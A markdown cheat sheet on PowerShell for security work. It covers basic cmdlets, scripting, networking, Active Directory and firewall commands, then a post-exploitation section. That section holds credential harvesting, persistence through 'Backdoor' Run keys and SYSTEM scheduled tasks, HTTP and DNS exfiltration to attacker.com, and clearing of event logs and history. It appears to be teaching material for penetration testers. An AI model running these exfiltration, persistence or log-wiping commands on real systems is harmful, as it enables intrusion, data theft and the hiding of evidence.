# PowerShell for Cybersecurity Cheat Sheet

PowerShell is a powerful scripting language and command-line shell built on .NET. It's essential for Windows system administration and security testing.

## 📋 Table of Contents
- [Basic Commands](#basic-commands)
- [Variables and Data Types](#variables-and-data-types)
- [Control Flow](#control-flow)
- [Functions](#functions)
- [File Operations](#file-operations)
- [Network Operations](#network-operations)
- [System Information](#system-information)
- [Active Directory](#active-directory)
- [Security Commands](#security-commands)
- [Post-Exploitation](#post-exploitation)

## Basic Commands

### Getting Help

```powershell
# Get help for a command
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples
Get-Help Get-Process -Online

# Update help files
Update-Help

# Search for commands
Get-Command *network*
Get-Command -Verb Get
Get-Command -Noun Service

# Get command alias
Get-Alias
Get-Alias ls
```

### Basic Cmdlets

```powershell
# List processes
Get-Process

# List services
Get-Service

# List running services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Stop/Start service
Stop-Service -Name "ServiceName"
Start-Service -Name "ServiceName"
Restart-Service -Name "ServiceName"

# Get network adapters
Get-NetAdapter

# Get IP configuration
Get-NetIPConfiguration

# Test network connection
Test-NetConnection google.com
Test-NetConnection -ComputerName 192.168.1.1 -Port 80

# Get event logs
Get-EventLog -LogName System -Newest 10
Get-WinEvent -LogName Application -MaxEvents 10

# Clear screen
Clear-Host
cls
```

### Pipeline and Objects

```powershell
# Pipeline
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10

# Filter objects
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Process | Where-Object {$_.CPU -gt 100}

# Select properties
Get-Process | Select-Object Name, CPU, Memory

# Format output
Get-Process | Format-Table Name, CPU
Get-Process | Format-List *
Get-Process | Format-Wide Name

# Export to CSV
Get-Process | Export-Csv -Path "processes.csv"

# Export to JSON
Get-Process | ConvertTo-Json | Out-File "processes.json"

# Measure objects
Get-Process | Measure-Object
Get-ChildItem | Measure-Object -Property Length -Sum
```

## Variables and Data Types

```powershell
# Variables
$name = "Admin"
$age = 25
$isAdmin = $true

# Arrays
$ports = @(21, 22, 80, 443)
$ports[0]              # Access element
$ports += 8080         # Add element
$ports.Count           # Array length

# Hash tables
$user = @{
    Name = "Admin"
    Age = 25
    Role = "Administrator"
}
$user["Name"]          # Access value
$user.Name             # Alternative access
$user.Keys             # Get keys
$user.Values           # Get values

# Special variables
$PSVersionTable        # PowerShell version
$env:USERNAME          # Current username
$env:COMPUTERNAME      # Computer name
$env:PATH              # PATH variable
$PWD                   # Current directory
$Home                  # Home directory

# Data types
[string]$text = "Hello"
[int]$number = 42
[bool]$flag = $true
[array]$list = 1,2,3
```

## Control Flow

### Conditional Statements

```powershell
# If statement
if ($age -gt 18) {
    Write-Host "Adult"
} elseif ($age -eq 18) {
    Write-Host "Just turned adult"
} else {
    Write-Host "Minor"
}

# Comparison operators
# -eq  Equal
# -ne  Not equal
# -gt  Greater than
# -lt  Less than
# -ge  Greater than or equal
# -le  Less than or equal
# -like  Wildcard match
# -match  Regex match

# Switch statement
switch ($port) {
    22  { Write-Host "SSH" }
    80  { Write-Host "HTTP" }
    443 { Write-Host "HTTPS" }
    default { Write-Host "Unknown" }
}
```

### Loops

```powershell
# For loop
for ($i = 0; $i -lt 10; $i++) {
    Write-Host "Count: $i"
}

# ForEach loop
$ports = @(21, 22, 80, 443)
foreach ($port in $ports) {
    Write-Host "Port: $port"
}

# ForEach-Object (pipeline)
Get-Process | ForEach-Object {
    Write-Host $_.Name
}

# While loop
$count = 0
while ($count -lt 5) {
    Write-Host "Count: $count"
    $count++
}

# Do-While loop
do {
    $input = Read-Host "Enter password"
} while ($input -ne "secret")

# Break and Continue
foreach ($num in 1..10) {
    if ($num -eq 5) { break }      # Exit loop
    if ($num % 2 -eq 0) { continue } # Skip iteration
    Write-Host $num
}
```

## Functions

```powershell
# Basic function
function Get-Greeting {
    Write-Host "Hello World"
}

# Function with parameters
function Get-Sum {
    param(
        [int]$a,
        [int]$b
    )
    return $a + $b
}

# Function with mandatory parameters
function Connect-Server {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ServerName,
        
        [Parameter(Mandatory=$false)]
        [int]$Port = 80
    )
    Write-Host "Connecting to $ServerName on port $Port"
}

# Advanced function
function Test-Port {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ComputerName,
        
        [Parameter(Mandatory=$true)]
        [int]$Port
    )
    
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($ComputerName, $Port)
        $tcpClient.Close()
        return $true
    } catch {
        return $false
    }
}

# Call function
$result = Get-Sum -a 10 -b 20
Test-Port -ComputerName "192.168.1.1" -Port 80
```

## File Operations

```powershell
# Current directory
Get-Location
Set-Location C:\Windows

# List files
Get-ChildItem
Get-ChildItem -Recurse
Get-ChildItem -Filter *.txt
Get-ChildItem -Path C:\Windows -Include *.exe -Recurse

# Create directory
New-Item -ItemType Directory -Path "C:\Test"
mkdir C:\Test

# Create file
New-Item -ItemType File -Path "C:\test.txt"
"Content" | Out-File "C:\test.txt"

# Read file
Get-Content "C:\test.txt"
$content = Get-Content "C:\test.txt"

# Read file line by line
Get-Content "C:\test.txt" | ForEach-Object {
    Write-Host $_
}

# Write to file
"New content" | Out-File "C:\test.txt"
"Append content" | Add-Content "C:\test.txt"

# Copy file
Copy-Item "C:\source.txt" "C:\dest.txt"
Copy-Item "C:\source\" "C:\dest\" -Recurse

# Move file
Move-Item "C:\source.txt" "C:\dest.txt"

# Remove file
Remove-Item "C:\test.txt"
Remove-Item "C:\folder\" -Recurse -Force

# Test path
Test-Path "C:\test.txt"

# Get file hash
Get-FileHash "C:\file.exe" -Algorithm SHA256

# Search in files
Select-String -Path "C:\*.txt" -Pattern "password"
Get-ChildItem -Recurse | Select-String "password"
```

## Network Operations

### Network Information

```powershell
# Get network adapters
Get-NetAdapter
Get-NetAdapter | Where-Object {$_.Status -eq "Up"}

# Get IP configuration
Get-NetIPConfiguration
Get-NetIPAddress

# Get routing table
Get-NetRoute

# Get ARP cache
Get-NetNeighbor

# Get DNS client cache
Get-DnsClientCache
Clear-DnsClientCache

# Get firewall rules
Get-NetFirewallRule
Get-NetFirewallRule | Where-Object {$_.Enabled -eq $true}
```

### Network Testing

```powershell
# Ping host
Test-Connection -ComputerName google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Test port
Test-NetConnection -ComputerName 192.168.1.1 -Port 80
Test-NetConnection -ComputerName google.com -Port 443 -InformationLevel Detailed

# DNS resolution
Resolve-DnsName google.com
Resolve-DnsName -Name google.com -Type MX

# Traceroute
Test-NetConnection -ComputerName google.com -TraceRoute
```

### Web Requests

```powershell
# HTTP GET request
Invoke-WebRequest -Uri "https://example.com"
$response = Invoke-WebRequest -Uri "https://example.com"
$response.StatusCode
$response.Content
$response.Headers

# HTTP POST request
$body = @{
    username = "admin"
    password = "password"
}
Invoke-WebRequest -Uri "https://example.com/login" -Method POST -Body $body

# REST API
Invoke-RestMethod -Uri "https://api.example.com/data"
$data = Invoke-RestMethod -Uri "https://api.example.com/data" -Method GET

# Download file
Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "file.zip"

# Custom headers
$headers = @{
    "User-Agent" = "PowerShell"
    "Authorization" = "Bearer TOKEN"
}
Invoke-WebRequest -Uri "https://api.example.com" -Headers $headers
```

### Port Scanning

```powershell
# Simple port scanner
function Test-PortRange {
    param(
        [string]$ComputerName,
        [int]$StartPort,
        [int]$EndPort
    )
    
    $openPorts = @()
    for ($port = $StartPort; $port -le $EndPort; $port++) {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $async = $tcpClient.BeginConnect($ComputerName, $port, $null, $null)
        $wait = $async.AsyncWaitHandle.WaitOne(100, $false)
        
        if ($wait) {
            try {
                $tcpClient.EndConnect($async)
                Write-Host "[+] Port $port is open"
                $openPorts += $port
            } catch {}
        }
        $tcpClient.Close()
    }
    return $openPorts
}

# Usage
Test-PortRange -ComputerName "192.168.1.1" -StartPort 1 -EndPort 1000
```

## System Information

```powershell
# Computer information
Get-ComputerInfo

# Operating system
Get-CimInstance Win32_OperatingSystem
(Get-CimInstance Win32_OperatingSystem).Caption

# Computer name and domain
$env:COMPUTERNAME
(Get-CimInstance Win32_ComputerSystem).Domain

# CPU information
Get-CimInstance Win32_Processor

# Memory information
Get-CimInstance Win32_PhysicalMemory
(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB

# Disk information
Get-PSDrive
Get-Disk
Get-Volume
Get-CimInstance Win32_LogicalDisk

# BIOS information
Get-CimInstance Win32_BIOS

# Installed software
Get-WmiObject -Class Win32_Product
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*

# Hotfixes
Get-HotFix
Get-HotFix | Sort-Object InstalledOn -Descending

# Environment variables
Get-ChildItem Env:
$env:PATH
$env:USERNAME
```

## Active Directory

```powershell
# Import AD module
Import-Module ActiveDirectory

# Get domain information
Get-ADDomain
Get-ADForest

# List users
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity "username"

# Search users
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Enabled -eq $true}

# List groups
Get-ADGroup -Filter *
Get-ADGroup -Identity "Domain Admins"

# Get group members
Get-ADGroupMember -Identity "Domain Admins"

# List computers
Get-ADComputer -Filter *
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}

# Get organizational units
Get-ADOrganizationalUnit -Filter *

# Find domain controllers
Get-ADDomainController -Filter *

# Get password policy
Get-ADDefaultDomainPasswordPolicy

# Check if user is admin
$user = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($user)
$principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

## Security Commands

### User and Group Management

```powershell
# Local users
Get-LocalUser
New-LocalUser -Name "testuser" -Password (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force)
Remove-LocalUser -Name "testuser"
Set-LocalUser -Name "testuser" -Password (ConvertTo-SecureString "NewP@ss" -AsPlainText -Force)

# Local groups
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
Add-LocalGroupMember -Group "Administrators" -Member "testuser"
Remove-LocalGroupMember -Group "Administrators" -Member "testuser"
```

### Firewall

```powershell
# Get firewall status
Get-NetFirewallProfile

# Enable/Disable firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# List firewall rules
Get-NetFirewallRule
Get-NetFirewallRule | Where-Object {$_.Enabled -eq $true}

# Create firewall rule
New-NetFirewallRule -DisplayName "Allow Port 80" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow

# Remove firewall rule
Remove-NetFirewallRule -DisplayName "Allow Port 80"

# Block program
New-NetFirewallRule -DisplayName "Block Program" -Direction Outbound -Program "C:\program.exe" -Action Block
```

### Event Logs

```powershell
# Get event logs
Get-EventLog -List
Get-EventLog -LogName Security -Newest 10
Get-EventLog -LogName System -EntryType Error -Newest 10

# Get Windows Event Logs (newer)
Get-WinEvent -ListLog *
Get-WinEvent -LogName Application -MaxEvents 10
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 10

# Search event logs
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4624,4625
    StartTime=(Get-Date).AddDays(-1)
}

# Clear event log
Clear-EventLog -LogName Application
```

### Registry

```powershell
# Navigate registry
Set-Location HKLM:\SOFTWARE
Get-ChildItem

# Get registry value
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"

# Set registry value
Set-ItemProperty -Path "HKLM:\SOFTWARE\MyApp" -Name "Setting" -Value "Value"

# Create registry key
New-Item -Path "HKLM:\SOFTWARE\MyApp"

# Remove registry key
Remove-Item -Path "HKLM:\SOFTWARE\MyApp" -Recurse

# Search registry
Get-ChildItem -Path HKLM:\SOFTWARE -Recurse | Where-Object {$_.Name -like "*pattern*"}
```

## Post-Exploitation

### System Reconnaissance

```powershell
# System information
systeminfo
Get-ComputerInfo
Get-CimInstance Win32_OperatingSystem

# Network configuration
ipconfig /all
Get-NetIPConfiguration

# Routing table
route print
Get-NetRoute

# ARP cache
arp -a
Get-NetNeighbor

# Current user
whoami
whoami /priv
whoami /groups

# Domain information
$env:USERDOMAIN
$env:LOGONSERVER
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### Credential Access

```powershell
# Saved credentials
cmdkey /list

# Extract WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="WiFiName" key=clear

# LSA secrets (requires SYSTEM)
# Use Mimikatz or similar tools

# Search for passwords in files
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

### Privilege Escalation

```powershell
# Check privileges
whoami /priv

# Check if admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Unquoted service paths
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "*`"*" -and $_.PathName -like "* *"}

# Services with weak permissions
Get-Acl -Path "C:\Program Files\Service\service.exe" | Format-List

# Scheduled tasks
Get-ScheduledTask
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}

# Startup programs
Get-CimInstance Win32_StartupCommand
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### Persistence

```powershell
# Registry Run key
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\backdoor.exe"

# Scheduled task
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Backdoor" -Action $action -Trigger $trigger -User "SYSTEM"

# WMI event subscription (advanced)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "Backdoor"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
```

### Data Exfiltration

```powershell
# Compress and exfiltrate
Compress-Archive -Path C:\sensitive\ -DestinationPath C:\data.zip
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile C:\data.zip

# Base64 encode
$bytes = [System.IO.File]::ReadAllBytes("C:\file.txt")
$base64 = [System.Convert]::ToBase64String($bytes)

# DNS exfiltration
$data = Get-Content C:\file.txt
foreach ($line in $data) {
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($line))
    Resolve-DnsName "$encoded.attacker.com"
}
```

### Anti-Forensics

```powershell
# Clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Clear PowerShell history
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Delete file securely
# Note: This is basic, not cryptographically secure
function Remove-FileSecurely {
    param([string]$Path)
    
    $file = Get-Item $Path
    $size = $file.Length
    
    # Overwrite with random data
    $random = New-Object byte[] $size
    (New-Object Random).NextBytes($random)
    [System.IO.File]::WriteAllBytes($Path, $random)
    
    # Delete
    Remove-Item $Path -Force
}
```

## Resources

- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
- [PowerShell Gallery](https://www.powershellgallery.com/)
- [PowerShell Empire](https://github.com/BC-SECURITY/Empire)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

